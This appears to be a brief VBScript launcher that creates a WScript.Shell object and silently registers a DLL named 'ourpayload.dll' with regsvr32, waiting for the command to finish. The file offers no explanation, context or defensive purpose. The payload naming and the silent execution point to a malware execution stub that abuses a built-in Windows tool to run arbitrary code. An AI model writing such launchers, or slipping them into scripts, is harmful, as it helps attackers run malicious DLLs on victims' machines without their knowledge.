' Create a WScript Shell object
Set WshShell = WScript.CreateObject("WScript.Shell")

' Define the command to run regsvr32
command = "regsvr32 /s ourpayload.dll"

' Run the command
WshShell.Run command, 1, True


